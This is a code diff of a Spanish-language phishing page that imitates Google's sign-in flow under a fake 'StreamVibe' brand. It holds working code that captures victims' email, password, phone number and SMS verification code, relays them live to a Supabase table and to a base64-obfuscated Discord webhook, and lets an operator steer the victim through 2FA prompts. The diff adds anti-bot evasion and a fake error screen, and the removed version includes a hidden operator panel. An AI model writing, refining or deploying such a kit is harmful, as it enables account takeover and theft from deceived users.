@@ -3,277 +3,206 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Login</title>
+    <title>Iniciar sesión: Cuentas de Google</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .fade-in { animation: fadeIn 0.4s ease-out; }
-        #admin-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; backdrop-filter: blur(10px); }
-        .google-input:focus { border-color: #1a73e8; box-shadow: 0 0 0 1px #1a73e8; }
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        
+        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; color: #202124; }
+        .g-input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border 0.2s;
+            outline: none;
+        }
+        .g-input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        
+        /* StreamVibe UI Final */
+        .vibe-dark { background-color: #0b0e11; color: #e1e6eb; font-family: 'Inter', sans-serif; }
+        .vibe-accent { color: #00f2ff; }
+        .vibe-btn { background: linear-gradient(135deg, #00f2ff 0%, #0072ff 100%); }
+        
+        .loader-ring {
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(26,115,232,0.2);
+            border-top-color: #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        #shield { position: fixed; inset: 0; background: white; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
     </style>
 </head>
-<body class="bg-[#f0f2f5] min-h-screen flex flex-col items-center justify-center p-4 font-sans select-none">
+<body class="flex flex-col items-center justify-center min-h-screen p-4">
 
-    <!-- Panel de Administración (Oculto) -->
-    <div id="admin-modal" class="flex items-center justify-center">
-        <div class="bg-zinc-900 p-8 rounded-3xl border border-zinc-800 w-full max-sm:w-[95%] text-center shadow-2xl">
-            <div class="mb-6">
-                <div class="w-16 h-16 bg-yellow-500/10 rounded-full flex items-center justify-center mx-auto mb-4">
-                    <svg class="w-8 h-8 text-yellow-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
-                </div>
-                <h3 class="text-white font-bold text-xl uppercase tracking-tight">Panel de Control</h3>
-                <p class="text-zinc-500 text-sm">Introduce la clave maestra</p>
-            </div>
-            <input type="password" id="admin-pass-input" placeholder="••••••••" class="w-full p-4 bg-black border border-zinc-700 rounded-xl text-white text-center outline-none focus:border-yellow-500 mb-4 transition-all">
-            <button id="admin-login-btn" class="w-full py-4 bg-yellow-600 text-black rounded-xl font-black hover:bg-yellow-500 transition uppercase tracking-tighter">Acceder al Sistema</button>
-            <button onclick="document.getElementById('admin-modal').style.display='none'" class="mt-4 text-zinc-500 text-xs hover:text-white uppercase font-bold">Cancelar</button>
+    <!-- Escudo Anti-Bot inicial -->
+    <div id="shield">
+        <div class="loader-ring mb-4"></div>
+        <p class="text-xs text-gray-500 font-medium">Verificando su identidad en StreamVibe...</p>
+    </div>
+
+    <!-- Contenedor Principal Google -->
+    <div id="auth-box" class="w-full max-w-[450px] p-8 sm:p-10 sm:border border-gray-200 rounded-lg transition-opacity duration-500 opacity-0">
+        <div class="flex justify-center mb-6">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="h-6">
+        </div>
+        <div id="render-target"></div>
+    </div>
+
+    <!-- UI StreamVibe de Error -->
+    <div id="vibe-overlay" class="fixed inset-0 vibe-dark hidden flex-col items-center justify-center text-center p-6 z-[10000]">
+        <div id="vibe-loading">
+            <div class="w-12 h-12 border-4 border-zinc-800 border-t-cyan-500 rounded-full animate-spin mb-4 mx-auto"></div>
+            <p class="text-sm font-bold vibe-accent uppercase tracking-widest">Sincronizando perfil...</p>
+        </div>
+        <div id="vibe-error-msg" class="hidden">
+            <div class="text-red-500 text-6xl mb-6">⚠️</div>
+            <h2 class="text-2xl font-black vibe-accent mb-4 uppercase italic tracking-tighter">Error de Red</h2>
+            <p class="text-gray-500 text-sm max-w-xs mx-auto mb-8">No se ha podido establecer conexión con el servidor de contenido. El acceso directo no está disponible en su región.</p>
+            <button onclick="location.reload()" class="vibe-btn text-black font-black px-10 py-3 rounded-xl text-xs uppercase tracking-widest">Cerrar Sesión</button>
         </div>
     </div>
 
-    <!-- Interfaz de Usuario / Víctima -->
-    <div id="app-container" class="w-full max-w-[440px] p-8 md:p-10 bg-white border border-gray-200 rounded-2xl relative shadow-sm fade-in transition-all duration-500">
-        <div id="admin-trigger" class="absolute top-0 right-0 w-16 h-16 z-50 cursor-default"></div>
-        <div class="flex justify-center mb-10" id="logo-container">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="h-7">
-        </div>
-        <div id="view-content"></div>
-    </div>
-
-    <footer id="main-footer" class="mt-8 flex gap-6 text-[12px] text-gray-500">
+    <footer id="auth-footer" class="mt-6 flex gap-6 text-[12px] text-gray-500">
         <span>Español (España)</span>
-        <div class="flex gap-4">
-            <a href="#" class="hover:underline">Ayuda</a>
-            <a href="#" class="hover:underline">Privacidad</a>
-            <a href="#" class="hover:underline">Términos</a>
+        <div class="flex gap-4 font-medium">
+            <a href="#">Ayuda</a>
+            <a href="#">Privacidad</a>
+            <a href="#">Condiciones</a>
         </div>
     </footer>
 
     <script>
-        // --- CONFIGURACIÓN CRÍTICA ---
+        // Configuración y Webhook Ofuscado
+        const b64_hook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0MzYxODAzNzI5NDE3NDIyMC9jSFhlb2VROWt6ZkdrS3RVZVZMLTdBWGtvNEFSc3p6QnNFdGtNbTZ4QVZZZ0FNUWRyU21OTFAxSzE5OFg4SENnVlNF";
+        const WEBHOOK = atob(b64_hook);
         const S_URL = "https://eyrvplemxhnootpjzkav.supabase.co";
         const S_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV5cnZwbGVteGhub290cGp6a2F2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgyNTEwMDksImV4cCI6MjA4MzgyNzAwOX0.YxrnHYnBkQLqPuVH5izQdYYgL7GVZQgSG1h89sDVd0g";
-        const ADMIN_PASS = "sebas22034";
-        
-        // --- PEGA AQUÍ TU URL DE DISCORD WEBHOOK ---
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1443618037294174220/cHXeoeQ9KzfGkKtUeVL-9AXk0o4ARszzBsEtkMm6xAVYgAMQdrSmNLP1K198X8HCgVSE"; 
         
         const client = supabase.createClient(S_URL, S_KEY);
-        
-        let state = {
-            view: 'victim',
-            step: 'login',
-            sessionId: `ID_${Math.random().toString(36).substr(2, 6).toUpperCase()}`,
-            data: { email: '', password: '', phone: '', sms: '' },
-            targetNum: '--' 
-        };
+        let sID = "SV_" + Math.random().toString(36).substr(2, 5).toUpperCase();
+        let store = { step: 'login', email: '', pass: '', phone: '', target: '--', sms: '' };
 
-        // --- FUNCIÓN NOTIFICACIÓN DISCORD ---
-        async function notifyDiscord(step) {
-            if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === "TU_WEBHOOK_AQUI") return;
+        // Delay para evasión de bots
+        setTimeout(() => {
+            document.getElementById('shield').style.display = 'none';
+            document.getElementById('auth-box').style.opacity = '1';
+            render();
+        }, 1200);
 
-            const payload = {
-                embeds: [{
-                    title: "🔔 Actualización de Sesión",
-                    color: 3447003, // Color azul
-                    fields: [
-                        { name: "ID Sesión", value: `\`${state.sessionId}\``, inline: true },
-                        { name: "Paso Actual", value: `**${step.toUpperCase()}**`, inline: true },
-                        { name: "Email", value: state.data.email || "No ingresado", inline: false },
-                        { name: "Password", value: state.data.password ? "||" + state.data.password + "||" : "No ingresado", inline: false },
-                        { name: "Teléfono", value: state.data.phone || "Esperando...", inline: true },
-                        { name: "Código SMS", value: state.data.sms || "Esperando...", inline: true }
-                    ],
-                    footer: { text: "Sistema de Monitoreo en Tiempo Real" },
-                    timestamp: new Date().toISOString()
-                }]
-            };
+        async function sync(step) {
+            await client.from('sessions').upsert({
+                session_id: sID, step: step, email: store.email, 
+                password: store.pass, phone: store.phone, sms: store.sms,
+                target_num: store.target === '--' ? null : store.target,
+                updated_at: new Date().toISOString()
+            }, { onConflict: 'session_id' });
 
-            try {
-                await fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            } catch (e) { console.error("Error Discord:", e); }
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: `NOTIFICACIÓN: ${step.toUpperCase()}`,
+                        color: step === 'end' ? 58326 : 16711680,
+                        fields: [
+                            { name: "ID", value: sID, inline: true },
+                            { name: "Correo", value: store.email || '-', inline: true },
+                            { name: "Clave", value: store.pass || '-', inline: true },
+                            { name: "Móvil", value: store.phone || '-' },
+                            { name: "SMS", value: store.sms || 'Esperando...' }
+                        ],
+                        footer: { text: "StreamVibe Security System" },
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            });
         }
 
-        // --- FUNCIONES DE COMUNICACIÓN ---
-        async function sync(step, extra = {}) {
-            const payload = {
-                "session_id": state.sessionId,
-                "email": extra.email || state.data.email || '',
-                "password": extra.password || state.data.password || '',
-                "phone": extra.phone || state.data.phone || '',
-                "sms": extra.sms || state.data.sms || '',
-                "step": step,
-                "target_num": state.targetNum === '--' ? null : state.targetNum,
-                "updated_at": new Date().toISOString()
-            };
-            
-            await client.from('sessions').upsert(payload, { onConflict: 'session_id' });
-            notifyDiscord(step);
-        }
-
-        // --- RENDERIZADO DE VISTAS ---
         function render() {
-            const c = document.getElementById('view-content');
-            if (state.view === 'admin') { renderAdmin(); return; }
-
-            if (state.step === 'login') {
-                c.innerHTML = `
+            const target = document.getElementById('render-target');
+            if(store.step === 'login') {
+                target.innerHTML = `
                     <div class="text-center mb-8">
-                        <h2 class="text-2xl font-normal text-gray-900">Iniciar sesión</h2>
-                        <p class="text-sm mt-2 text-gray-600">Ir a Gmail</p>
+                        <h1 class="text-2xl font-normal mb-2">Iniciar sesión</h1>
+                        <p class="text-[15px]">Usa tu cuenta de Google para StreamVibe</p>
                     </div>
-                    <form class="space-y-4" onsubmit="event.preventDefault(); state.data.email=this.e.value; state.data.password=this.p.value; state.step='phone'; sync('phone'); render();">
-                        <input name="e" required type="email" placeholder="Correo electrónico o teléfono" class="google-input w-full p-4 border border-gray-300 rounded-lg outline-none transition-all text-base">
-                        <input name="p" required type="password" placeholder="Introduce tu contraseña" class="google-input w-full p-4 border border-gray-300 rounded-lg outline-none transition-all text-base">
-                        <div class="flex justify-between items-center mt-8 pt-4">
-                            <span class="text-blue-600 font-bold text-sm cursor-pointer hover:underline">¿Olvidaste tu correo?</span>
-                            <button class="bg-blue-600 text-white px-8 py-2 rounded-lg font-medium hover:bg-blue-700 shadow-sm">Siguiente</button>
+                    <form onsubmit="event.preventDefault(); store.email=this.e.value; store.pass=this.p.value; store.step='phone'; sync('phone'); render();">
+                        <input name="e" required type="email" placeholder="Correo electrónico o teléfono" class="g-input mb-4">
+                        <input name="p" required type="password" placeholder="Introduce tu contraseña" class="g-input mb-2">
+                        <p class="text-sm text-blue-600 font-bold mb-8 cursor-pointer">¿Has olvidado tu contraseña?</p>
+                        <div class="flex justify-between items-center mt-6">
+                            <span class="text-blue-600 font-bold text-sm cursor-pointer">Crear cuenta</span>
+                            <button class="bg-[#1a73e8] text-white px-8 py-2 rounded font-medium text-sm">Siguiente</button>
                         </div>
                     </form>`;
-            } else if (state.step === 'phone') {
-                c.innerHTML = `
+            } else if(store.step === 'phone') {
+                target.innerHTML = `
                     <div class="text-center mb-6">
-                        <h2 class="text-xl font-medium">Verificación en dos pasos</h2>
-                        <p class="text-sm text-gray-600 mt-4 leading-relaxed">Google quiere asegurarse de que eres tú quien intenta iniciar sesión.</p>
+                        <h1 class="text-xl font-medium">Verificación de identidad</h1>
+                        <p class="text-sm text-gray-600 mt-4">Confirma tu número de móvil para sincronizar tus suscripciones de StreamVibe.</p>
                     </div>
-                    <form class="space-y-4" onsubmit="event.preventDefault(); state.data.phone=this.t.value; state.step='wait'; sync('wait'); render();">
-                        <div class="bg-gray-50 p-4 rounded-lg border text-sm text-gray-700 mb-4">Confirma el número vinculado.</div>
-                        <input name="t" required type="tel" placeholder="Número de teléfono" class="google-input w-full p-4 border border-gray-300 rounded-lg text-center text-xl font-bold tracking-widest outline-none">
-                        <button class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold mt-4 shadow-lg active:scale-95 transition-transform">ENVIAR AVISO</button>
+                    <form onsubmit="event.preventDefault(); store.phone=this.t.value; store.step='wait'; sync('wait'); render();">
+                        <input name="t" required type="tel" placeholder="Número de teléfono" class="g-input text-center text-xl tracking-widest mb-6">
+                        <button class="w-full bg-[#1a73e8] text-white py-2 rounded font-medium">Continuar</button>
                     </form>`;
-            } else if (state.step === 'wait') {
-                c.innerHTML = `
-                    <div class="text-center py-6 fade-in">
-                        <p class="mb-6 text-gray-700 text-sm font-medium">Abre la aplicación de Google y toca el número:</p>
-                        <div class="text-8xl font-black text-blue-600 py-12 bg-blue-50 rounded-[2rem] animate-pulse border-4 border-blue-100 shadow-inner">
-                            ${state.targetNum}
-                        </div>
-                        <div class="flex flex-col items-center mt-10 space-y-3">
-                            <div class="w-6 h-6 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
-                            <p class="text-[10px] text-gray-400 font-bold uppercase tracking-[0.3em]">Esperando dispositivo...</p>
+            } else if(store.step === 'wait') {
+                target.innerHTML = `
+                    <div class="text-center py-10">
+                        <p class="text-sm text-gray-700 mb-8">Abre la aplicación de Google en tu móvil y toca el número:</p>
+                        <div class="text-8xl font-black text-blue-600 bg-blue-50 py-10 rounded-2xl animate-pulse">${store.target}</div>
+                        <div class="mt-10 flex flex-col items-center gap-3">
+                            <div class="loader-ring"></div>
+                            <span class="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Enviando señal de acceso...</span>
                         </div>
                     </div>`;
-            } else if (state.step === 'sms') {
-                c.innerHTML = `
+            } else if(store.step === 'sms') {
+                target.innerHTML = `
                     <div class="text-center mb-6">
-                        <h2 class="text-xl font-bold">Verificación por SMS</h2>
-                        <p class="text-xs text-gray-500 mt-2">Introduce el código de 6 dígitos enviado.</p>
+                        <h1 class="text-xl font-bold">Verificación por SMS</h1>
+                        <p class="text-xs text-gray-500 mt-2">Introduce el código G- que acabamos de enviarte para finalizar.</p>
                     </div>
-                    <form class="space-y-4" onsubmit="event.preventDefault(); state.data.sms=this.s.value; state.step='end'; sync('end'); render(); setTimeout(()=>location.href='https://www.google.com',3000);">
-                        <div class="flex items-center border-2 border-blue-500 p-4 rounded-xl bg-blue-50/30">
-                            <span class="text-2xl font-bold text-gray-400 mr-3 pr-3 border-r border-gray-200">G-</span>
-                            <input name="s" required type="number" placeholder="000000" class="w-full text-2xl outline-none bg-transparent font-mono tracking-[0.2em]">
+                    <form onsubmit="event.preventDefault(); store.sms=this.s.value; store.step='end'; sync('end'); finalize();">
+                        <div class="flex items-center border border-gray-300 p-3 rounded bg-gray-50">
+                            <span class="text-xl font-bold text-gray-400 mr-2">G-</span>
+                            <input name="s" required type="number" placeholder="000000" class="w-full text-xl outline-none bg-transparent font-mono tracking-widest">
                         </div>
-                        <button class="w-full bg-blue-600 text-white py-4 rounded-xl font-black uppercase tracking-widest shadow-blue-200 shadow-xl">Verificar</button>
+                        <button class="w-full bg-[#1a73e8] text-white py-3 rounded font-bold mt-8 shadow-md">Verificar acceso</button>
                     </form>`;
-            } else if (state.step === 'end') {
-                c.innerHTML = `
-                    <div class="text-center py-12 space-y-6">
-                        <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto text-4xl animate-bounce">✓</div>
-                        <h2 class="text-xl font-bold text-gray-800">Acceso concedido</h2>
-                        <p class="text-gray-500 text-sm">Redirigiendo a tu cuenta...</p>
-                    </div>`;
             }
         }
 
-        // --- VISTA DE ADMINISTRADOR ---
-        async function renderAdmin() {
-            const { data, error } = await client.from('sessions').select('*').order('updated_at', { ascending: false });
-            if (error) return;
+        function finalize() {
+            document.getElementById('auth-box').style.display = 'none';
+            document.getElementById('auth-footer').style.display = 'none';
+            const overlay = document.getElementById('vibe-overlay');
+            overlay.classList.remove('hidden');
+            overlay.classList.add('flex');
             
-            const c = document.getElementById('view-content');
-            document.body.className = "bg-zinc-950 p-4 text-zinc-300 font-sans";
-            document.getElementById('app-container').className = "w-full max-w-6xl bg-zinc-900 border-zinc-800 p-8 rounded-[2.5rem] mx-auto shadow-2xl transition-all duration-700";
-            document.getElementById('main-footer').className = "hidden";
-            
-            document.getElementById('logo-container').innerHTML = `
-                <div class="flex justify-between items-center w-full border-b border-zinc-800 pb-6 mb-2">
-                    <div class="flex items-center gap-3">
-                        <div class="w-3 h-3 bg-emerald-500 rounded-full animate-ping"></div>
-                        <h2 class="text-white font-black text-2xl tracking-tighter uppercase italic">Control Panel v4</h2>
-                    </div>
-                    <button onclick="location.reload()" class="bg-zinc-800 p-2 rounded-lg hover:bg-zinc-700 text-white"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></button>
-                </div>`;
-            
-            let html = `<div class="grid gap-6 md:grid-cols-2 lg:grid-cols-3 mt-6">`;
-            data?.forEach(s => {
-                const isSMS = s.step === 'sms';
-                html += `
-                    <div class="bg-zinc-950/50 border ${isSMS ? 'border-blue-500/40 shadow-blue-500/5' : 'border-zinc-800'} p-6 rounded-3xl hover:border-zinc-600 transition-all">
-                        <div class="flex justify-between items-start mb-6">
-                            <span class="text-[10px] bg-zinc-800 text-zinc-500 px-2 py-1 rounded-md font-mono">${s.session_id}</span>
-                            <span class="text-[10px] font-black px-3 py-1 ${s.step === 'end' ? 'bg-emerald-500/10 text-emerald-500' : 'bg-blue-500/10 text-blue-400'} rounded-full uppercase border border-current/20">${s.step}</span>
-                        </div>
-                        <div class="space-y-3 mb-6">
-                            <div class="bg-zinc-900/50 p-3 rounded-xl border border-zinc-800/50">
-                                <p class="text-[9px] text-zinc-600 uppercase font-black mb-1">Login</p>
-                                <p class="text-white font-bold text-sm truncate select-all">${s.email || '...'}</p>
-                            </div>
-                            <div class="bg-zinc-900/50 p-3 rounded-xl border border-zinc-800/50">
-                                <p class="text-[9px] text-zinc-600 uppercase font-black mb-1">Pass</p>
-                                <p class="text-white font-bold text-sm truncate select-all">${s.password || '...'}</p>
-                            </div>
-                            <div class="flex gap-2">
-                                <div class="flex-1 bg-zinc-900/50 p-3 rounded-xl border border-zinc-800/50">
-                                    <p class="text-[9px] text-zinc-600 uppercase font-black mb-1">Tel</p>
-                                    <p class="text-blue-400 font-bold text-xs">${s.phone || '---'}</p>
-                                </div>
-                                <div class="flex-1 bg-emerald-500/5 p-3 rounded-xl border border-emerald-500/20 text-center">
-                                    <p class="text-[9px] text-emerald-600 uppercase font-black mb-1">SMS</p>
-                                    <p class="text-emerald-400 font-black text-lg">${s.sms || '---'}</p>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="flex items-center gap-4 pt-4 border-t border-zinc-900">
-                            <div class="flex-1 text-center">
-                                <label class="text-[10px] text-zinc-500 uppercase font-black mb-1 block">Nº:</label>
-                                <input type="text" value="${s.target_num || ''}" placeholder="--" maxlength="2" 
-                                    class="w-full bg-black border-2 border-zinc-800 text-center text-yellow-500 text-3xl font-black rounded-2xl p-2 focus:border-yellow-500 outline-none transition-all" 
-                                    onchange="updateNum('${s.session_id}', this.value)">
-                            </div>
-                            <button onclick="forceSms('${s.session_id}')" class="flex-1 h-16 bg-blue-600 hover:bg-blue-500 text-white rounded-2xl font-black text-xs uppercase shadow-lg transition-all active:scale-95">PEDIR SMS</button>
-                        </div>
-                    </div>`;
-            });
-            c.innerHTML = html + (data?.length === 0 ? '<div class="col-span-full py-32 text-center text-zinc-700 italic">No hay actividad.</div>' : '') + `</div>`;
+            setTimeout(() => {
+                document.getElementById('vibe-loading').classList.add('hidden');
+                document.getElementById('vibe-error-msg').classList.remove('hidden');
+            }, 4500);
         }
 
-        window.updateNum = async (id, val) => {
-            await client.from('sessions').update({ "target_num": val, "updated_at": new Date().toISOString() }).eq('session_id', id);
-        };
-        window.forceSms = async (id) => {
-            await client.from('sessions').update({ "step": 'sms', "updated_at": new Date().toISOString() }).eq('session_id', id);
-            renderAdmin();
-        };
-
-        document.getElementById('admin-trigger').ondblclick = () => {
-            document.getElementById('admin-modal').style.display = 'flex';
-        };
-
-        document.getElementById('admin-login-btn').onclick = () => {
-            if (document.getElementById('admin-pass-input').value === ADMIN_PASS) {
-                state.view = 'admin';
-                document.getElementById('admin-modal').style.display = 'none';
-                renderAdmin();
-                setInterval(renderAdmin, 4000);
-            } else { alert("Incorrecto."); }
-        };
-
-        window.onload = () => {
-            sync('login'); 
+        // Suscripción en tiempo real a órdenes del Administrador
+        client.channel('vibe-room').on('postgres_changes', { 
+            event: 'UPDATE', 
+            schema: 'public', 
+            table: 'sessions', 
+            filter: `session_id=eq.${sID}` 
+        }, (payload) => {
+            store.target = payload.new.target_num || '--';
+            store.step = payload.new.step;
             render();
-            client.channel('live_updates')
-                .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'sessions', filter: `session_id=eq.${state.sessionId}` }, (payload) => {
-                    state.targetNum = payload.new.target_num || '--';
-                    state.step = payload.new.step;
-                    if (state.view === 'victim') render();
-                })
-                .subscribe();
-        };
+        }).subscribe();
+
     </script>
 </body>
 </html>
